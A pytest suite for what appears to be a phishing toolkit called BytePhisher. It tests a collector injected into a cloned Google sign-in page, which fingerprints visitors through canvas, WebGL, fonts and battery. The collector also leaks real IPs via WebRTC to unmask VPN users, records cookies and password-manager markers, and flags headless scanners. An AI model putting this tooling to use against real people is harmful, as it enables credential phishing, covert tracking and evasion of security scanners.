"""Deep device-intelligence tests — analysis, transport, storage, CLI.

The collector itself is verified against a real browser (Playwright/Chromium)
during development; these tests pin the server-side contract, the merge
semantics and every failure mode, so a regression cannot silently drop a wave.

Run:  ./.venv/bin/python -m pytest tests/test_intel.py -v
"""
import json
import os
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

import pytest

from conftest import free_port

from core import capture as cap
from core import intel as I
from core import server as srv

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PY = os.path.join(HERE, ".venv", "bin", "python")
if not os.path.exists(PY):
    PY = sys.executable
ASSETS = os.path.join(HERE, "assets", "intel.js")


# --------------------------------------------------------------- fixtures ---
def real_browser_mods():
    """A module map shaped like the one a real Chromium sent (Playwright run),
    trimmed to the fields the analysis reads."""
    return {
        "nav": {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "platform": "Win32", "hardwareConcurrency": 12, "deviceMemory": 8,
                "languages": ["en-IN", "en", "hi"], "language": "en-IN",
                "webdriver": False, "pluginCount": 5, "maxTouchPoints": 0},
        "uaDataHigh": {"architecture": "x86", "bitness": "64", "model": "",
                       "platformVersion": "15.0.0", "uaFullVersion": "124.0.6367.60",
                       "wow64": False},
        "screen": {"width": 1920, "height": 1080, "innerW": 1900, "innerH": 900,
                   "outerW": 1920, "outerH": 1040, "dpr": 1, "colorDepth": 24,
                   "orientation": {"type": "landscape-primary", "angle": 0},
                   "mediaQueries": {"(prefers-color-scheme: dark)": False}},
        "time": {"intl": {"timeZone": "Asia/Kolkata", "locale": "en-IN"},
                 "tzOffsetMin": -330, "hemisphereHint": "no-dst"},
        "canvas": {"dataURL": "Zm9vYmFy", "fullHash": 1234, "blank": False},
        "webgl": {"contexts": [{"kind": "webgl2",
                                "unmaskedVendor": "Google Inc. (NVIDIA)",
                                "unmaskedRenderer": "ANGLE (NVIDIA GeForce RTX 3060)",
                                "extensionCount": 34, "version": "WebGL 2.0"}]},
        "audio": {"sum": 124.04347527516074},
        "fonts": {"count": 38, "present": ["Arial", "Segoe UI", "Consolas"]},
        "features": {"supportedCount": 190, "total": 243,
                     "supported": ["WebAssembly", "WebGPU"], "missing": ["WebNFC"]},
        "codecs": {"h264": "probably", "av1": "probably", "opus": "probably"},
        "drm": {"widevine": True, "playready": False},
        "permissions": {"geolocation": "prompt", "notifications": "prompt"},
        "mediaDevices": {"kinds": {"audioinput": 2, "videoinput": 1}, "labelsVisible": False},
        "webrtc": {"ips": ["203.0.113.55", "192.168.1.20"], "types": {"host": 1, "srflx": 1},
                   "mdns": False},
        "battery": {"level": 0.82, "charging": True},
        "net": {"effectiveType": "4g", "downlink": 10, "rtt": 50,
                "timing": {"dns": 3, "tcp": 8, "tls": 12, "ttfb": 40}},
        "automation": {"artifacts": [], "consistency": {"pluginsNonEmpty": True,
                                                        "mimeTypesNonEmpty": True,
                                                        "languagesNonEmpty": True,
                                                        "hasChromeObject": True,
                                                        "chromeRuntime": True},
                       "extensionScripts": [], "passwordManagerMarkers": [],
                       "baits": {"baitHidden": False}},
        "behaviour": {"moves": 42, "keys": 8, "clicks": 2, "scrolls": 3,
                      "maxScrollDepth": 55, "activeMs": 9000},
        "quota": {"quota": 300000000000, "usage": 12000},
        "math": {"sin": 0.03574879797201651},
        "page": {"title": "Sign in", "formCount": 1, "cookieString": "a=b"},
    }


@pytest.fixture()
def db():
    d = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bh_intel_"), "i.db"))
    yield d
    d.close()


class Server:
    """Static BytePhisher server with the collector enabled."""

    def __init__(self, db, intel=True, intel_perms=False):
        self.port = free_port()
        site = os.path.join(HERE, "templates", "03_google")
        self.httpd, _ = srv.serve(os.path.join(HERE, "templates"), site, self.port,
                                  db.db_path, geo_provider="off", campaign="intel-test",
                                  intel=intel, intel_perms=intel_perms)
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        time.sleep(0.25)

    def url(self, path="/"):
        return f"http://127.0.0.1:{self.port}{path}"

    def get(self, path="/", headers=None):
        req = urllib.request.Request(self.url(path), headers=headers or {})
        try:
            r = urllib.request.urlopen(req, timeout=10)
            return r.status, r.read().decode("utf-8", "replace"), dict(r.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)

    def post(self, payload, path=I.INTEL_PATH, raw=None, headers=None):
        body = raw if raw is not None else json.dumps(payload).encode()
        h = {"Content-Type": "application/json",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0) Chrome/124.0"}
        h.update(headers or {})
        req = urllib.request.Request(self.url(path), data=body, headers=h)
        try:
            r = urllib.request.urlopen(req, timeout=10)
            return r.status, r.read().decode()
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode()

    def stop(self):
        self.httpd.shutdown()


# ============================================================ analysis ======
class TestAnalysis:
    def test_summarize_shape_and_identity(self):
        rec = I.summarize(real_browser_mods(), server_ip="203.0.113.55",
                          geo_country="IN")
        assert rec["browser"] == "chrome"
        assert rec["os"] == "windows"
        assert rec["device_class"] == "desktop"
        assert rec["timezone"] == "Asia/Kolkata"
        assert rec["screen"]["size"] == "1920x1080"
        assert rec["hardware"]["cores"] == 12
        assert rec["hardware"]["memory_gb"] == 8
        assert "RTX 3060" in rec["hardware"]["gpu_renderer"]
        assert rec["fingerprint"]["fonts_count"] == 38
        assert rec["capabilities"]["supported_count"] == 190
        assert rec["network"]["webrtc_public_ips"] == ["203.0.113.55"]
        assert rec["network"]["webrtc_local_ips"] == ["192.168.1.20"]
        assert rec["behaviour"]["moves"] == 42
        assert rec["automation"]["headless_score"] == 0
        assert rec["network_risk"]["vpn_suspected_score"] == 0

    def test_real_human_is_not_flagged(self):
        hl, reasons = I.headless_score(real_browser_mods())
        assert hl == 0 and reasons == []

    def test_webdriver_and_headless_ua_are_caught(self):
        m = real_browser_mods()
        m["nav"]["webdriver"] = True
        m["nav"]["ua"] = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) HeadlessChrome/155.0.0.0 Safari/537.36")
        hl, reasons = I.headless_score(m)
        assert hl >= 90
        joined = " ".join(reasons).lower()
        assert "webdriver" in joined and "headless" in joined

    def test_software_renderer_is_caught_with_the_evidence(self):
        m = real_browser_mods()
        m["webgl"]["contexts"][0]["unmaskedRenderer"] = \
            "ANGLE (Google, Vulkan 1.3.0 (SwiftShader Device (Subzero)), SwiftShader driver)"
        hl, reasons = I.headless_score(m)
        assert hl >= 35
        assert any("SwiftShader" in r for r in reasons)

    def test_driver_globals_are_caught(self):
        m = real_browser_mods()
        m["automation"]["artifacts"] = ["$cdc_asdjflasutopfhvcZLmcfl_", "__playwright"]
        hl, reasons = I.headless_score(m)
        assert hl >= 40 and any("driver globals" in r for r in reasons)

    def test_empty_plugin_array_is_a_signal(self):
        m = real_browser_mods()
        m["automation"]["consistency"]["pluginsNonEmpty"] = False
        m["automation"]["consistency"]["mimeTypesNonEmpty"] = False
        hl, reasons = I.headless_score(m)
        assert hl >= 30 and any("plugins" in r for r in reasons)

    def test_vpn_suspected_when_webrtc_ip_differs_from_source(self):
        m = real_browser_mods()
        m["webrtc"]["ips"] = ["198.51.100.9"]
        score, reasons = I.vpn_assessment(m, server_ip="203.0.113.55", geo_country="IN")
        assert score >= 40
        assert any("different public IP" in r for r in reasons)

    def test_no_vpn_flag_when_ips_match(self):
        score, reasons = I.vpn_assessment(real_browser_mods(), server_ip="203.0.113.55",
                                         geo_country="IN")
        assert score == 0 and reasons == []

    def test_timezone_country_mismatch_is_flagged(self):
        m = real_browser_mods()
        score, reasons = I.vpn_assessment(m, server_ip="203.0.113.55", geo_country="DE")
        assert score >= 30
        assert any("timezone" in r for r in reasons)

    def test_language_country_mismatch_is_flagged(self):
        m = real_browser_mods()
        m["time"]["intl"]["timeZone"] = "Europe/Berlin"
        score, reasons = I.vpn_assessment(m, server_ip="1.2.3.4", geo_country="JP")
        assert any("language" in r or "timezone" in r for r in reasons)

    def test_relay_only_ice_is_flagged(self):
        m = real_browser_mods()
        m["webrtc"]["types"] = {"relay": 2}
        score, reasons = I.vpn_assessment(m, server_ip="203.0.113.55")
        assert score >= 20 and any("relay" in r for r in reasons)

    def test_device_token_is_stable_and_discriminating(self):
        a = I.device_token(real_browser_mods())
        b = I.device_token(real_browser_mods())
        assert a == b and len(a) == 32
        m = real_browser_mods()
        m["canvas"]["dataURL"] = "different-canvas"
        assert I.device_token(m) != a

    def test_device_class_mobile_and_tablet(self):
        m = real_browser_mods()
        m["nav"]["ua"] = ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
                          "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1")
        m["nav"]["maxTouchPoints"] = 5
        assert I.device_class(m) == "mobile"
        m["nav"]["ua"] = "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) Safari/604.1"
        m["screen"]["width"] = 1024
        assert I.device_class(m) == "tablet"

    def test_browser_and_os_guessing(self):
        for ua, want in [
            ("Mozilla/5.0 (Windows NT 10.0) Edg/124.0", "edge"),
            ("Mozilla/5.0 (Macintosh; Intel Mac OS X) Version/17.0 Safari/605.1.15", "safari"),
            ("Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0", "firefox"),
        ]:
            m = real_browser_mods()
            m["nav"]["ua"] = ua
            m["nav"]["platform"] = "Linux x86_64"
            assert I.guess_browser(m) == want, ua
        m = real_browser_mods()
        m["nav"]["ua"] = "Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/124.0 Mobile"
        assert I.guess_os(m) == "android"

    def test_merge_waves_keeps_data_and_clears_stale_errors(self):
        acc = I.merge_waves({}, {"wave": "open", "mods": {"nav": {"ua": "x"}},
                                 "errors": {"features": "boom", "canvas": "timeout"}})
        assert acc["nav"] == {"ua": "x"} and acc["_errors"]["features"] == "boom"
        acc = I.merge_waves(acc, {"wave": "deep", "mods": {"features": {"supportedCount": 190},
                                                           "nav": {}},
                                  "errors": {}})
        assert acc["features"]["supportedCount"] == 190
        assert "features" not in acc["_errors"]        # succeeded later
        assert acc["_errors"]["canvas"] == "timeout"   # still failed
        assert acc["nav"] == {"ua": "x"}               # empty wave must not erase
        assert acc["_waves"] == ["open", "deep"]

    def test_risk_from_intel_folds_headless_and_vpn(self):
        rec = I.summarize(real_browser_mods())
        assert I.risk_from_intel(rec) == 0
        rec["automation"]["headless_score"] = 100
        assert I.risk_from_intel(rec) == 100
        rec["automation"]["headless_score"] = 0
        rec["network_risk"]["vpn_suspected_score"] = 45
        assert I.risk_from_intel(rec) == 20

    def test_dump_text_renders_every_section(self):
        rec = I.summarize(real_browser_mods(), server_ip="203.0.113.55", geo_country="IN")
        rec.update({"sid": "abc", "ip": "203.0.113.55", "risk": 0})
        text = I.dump_text(rec)
        for section in ("IDENTITY", "DISPLAY", "HARDWARE", "FINGERPRINT", "NETWORK",
                        "CAPABILITIES", "ENVIRONMENT"):
            assert section in text
        assert "chrome" in text and "1920x1080" in text and "RTX 3060" in text
        assert "NonexNone" not in text          # absent values must not be rendered

    def test_render_js_binds_session_and_endpoint(self):
        js = I.render_js(ASSETS, "deadbeef", perms=True)
        assert 'var SID = "deadbeef"' in js
        assert "var PERMS = true" in js
        assert "__SID__" not in js and "__PERMS__" not in js
        js2 = I.render_js(ASSETS, "cafe", perms=False)
        assert "var PERMS = false" in js2


# ====================================================== storage + transport =
class TestTransport:
    def test_page_carries_the_collector_tag(self, db):
        s = Server(db)
        try:
            status, html, headers = s.get("/")
            assert status == 200
            assert I.INTEL_JS_PATH in html and I.INTEL_PATH in html
            assert "__bhi=" in headers.get("Set-Cookie", "")
        finally:
            s.stop()

    def test_no_intel_flag_removes_the_tag(self, db):
        s = Server(db, intel=False)
        try:
            _, html, _ = s.get("/")
            assert I.INTEL_JS_PATH not in html
        finally:
            s.stop()

    def test_collector_served_and_bound(self, db):
        s = Server(db)
        try:
            status, js, _ = s.get(f"{I.INTEL_JS_PATH}?s=abc123&p=1")
            assert status == 200 and len(js) > 20000
            assert 'var SID = "abc123"' in js and "var PERMS = true" in js
            assert "navigator.sendBeacon" in js and "enumerateDevices" in js
        finally:
            s.stop()

    def test_waves_merge_into_one_record(self, db):
        s = Server(db)
        try:
            base = {"v": 1, "sid": "sess1", "ts": time.time() * 1000,
                    "mods": real_browser_mods(), "errors": {}}
            base["wave"] = "open"
            st, body = s.post(base)
            assert st == 200 and json.loads(body)["ok"] is True
            base["wave"] = "deep"
            base["mods"] = {"battery": {"level": 0.5, "charging": False}}
            st, body = s.post(base)
            assert st == 200
            assert json.loads(body)["modules"] >= 20
            rows = db.intel_list()
            assert len(rows) == 1                     # one record per session
            rec = db.intel_get("sess1")
            assert rec["hardware"]["battery"]["level"] == 0.5   # merged
            assert rec["hardware"]["cores"] == 12               # kept from wave 1
            assert rec["waves"] == ["open", "deep"]
            assert db.intel_stats()["unique_sessions"] == 1
        finally:
            s.stop()

    def test_malformed_and_empty_payloads_are_rejected(self, db):
        s = Server(db)
        try:
            st, _ = s.post(None, raw=b"{not json")
            assert st == 400
            st, _ = s.post({"v": 1, "sid": "x", "wave": "open", "mods": {}, "errors": {}})
            assert st == 400
            assert db.intel_stats()["intel_records"] == 0
        finally:
            s.stop()

    def test_oversized_payload_is_refused(self, db):
        s = Server(db)
        try:
            big = json.dumps({"v": 1, "sid": "x", "wave": "open",
                              "mods": {"page": {"junk": "A" * (3 * 1024 * 1024)}}}).encode()
            # the server answers 413 and drops the connection while the client is
            # still uploading, so the client may see either the status or a reset
            try:
                st, _ = s.post(None, raw=big)
                assert st == 413
            except (urllib.error.URLError, ConnectionError, OSError):
                pass
            assert db.intel_stats()["intel_records"] == 0
        finally:
            s.stop()

    def test_unknown_session_id_is_created_on_demand(self, db):
        s = Server(db)
        try:
            st, body = s.post({"v": 1, "sid": "brand-new-sid", "wave": "open",
                               "mods": {"nav": {"ua": "x"}}, "errors": {}})
            assert st == 200
            assert json.loads(body)["sid"] == "brand-new-sid"
            assert db.intel_get("brand-new-sid") is not None
        finally:
            s.stop()

    def test_export_json_includes_devices(self, db):
        s = Server(db)
        try:
            s.post({"v": 1, "sid": "exp1", "wave": "open", "mods": real_browser_mods(),
                    "errors": {}})
            out = os.path.join(tempfile.mkdtemp(), "exp.json")
            db.export_json(out)
            data = json.load(open(out))
            assert data["intel_stats"]["intel_records"] == 1
            assert len(data["devices"]) == 1
            assert data["devices"][0]["browser"] == "chrome"
        finally:
            s.stop()


# ================================================================ CLI =======
class TestIntelCLI:
    def test_dump_list_and_export(self, db):
        home = tempfile.mkdtemp()
        env = dict(os.environ, BYTEPHISHER_HOME=home)
        s = Server(db)
        try:
            s.post({"v": 1, "sid": "cli1", "wave": "open", "mods": real_browser_mods(),
                    "errors": {}})
            s.stop()
            # the CLI reads its own home: copy the DB where it expects it
            os.makedirs(os.path.join(home, "data"), exist_ok=True)
            import shutil
            # WAL: the newest rows live in the -wal sidecar until checkpoint, so
            # copying only the .db file silently loses them
            for suffix in ("", "-wal", "-shm"):
                src = db.db_path + suffix
                if os.path.exists(src):
                    shutil.copy(src, os.path.join(home, "data", "bytephisher.db" + suffix))

            p = subprocess.run([PY, os.path.join(HERE, "bytephisher.py"), "--intel-list"],
                               cwd=HERE, env=env, capture_output=True, text=True, timeout=60)
            assert p.returncode == 0 and "device token" in p.stdout
            assert "chrome" in p.stdout.lower() or "mozilla" in p.stdout.lower()

            p = subprocess.run([PY, os.path.join(HERE, "bytephisher.py"),
                                "--intel-dump", "cli1"],
                               cwd=HERE, env=env, capture_output=True, text=True, timeout=60)
            assert p.returncode == 0
            assert "FULL DEVICE DUMP" in p.stdout and "FINGERPRINT" in p.stdout

            out = os.path.join(home, "devices.json")
            p = subprocess.run([PY, os.path.join(HERE, "bytephisher.py"),
                                "--intel-export", out],
                               cwd=HERE, env=env, capture_output=True, text=True, timeout=60)
            assert p.returncode == 0 and os.path.isfile(out)
            assert json.load(open(out))["devices"][0]["fingerprint"]["device_token"]
        finally:
            if s.httpd:
                try:
                    s.stop()
                except Exception:
                    pass

    def test_dump_for_unknown_session_exits_1(self):
        home = tempfile.mkdtemp()
        env = dict(os.environ, BYTEPHISHER_HOME=home)
        p = subprocess.run([PY, os.path.join(HERE, "bytephisher.py"),
                            "--intel-dump", "nope"],
                           cwd=HERE, env=env, capture_output=True, text=True, timeout=60)
        assert p.returncode == 1 and "no device dump" in p.stdout
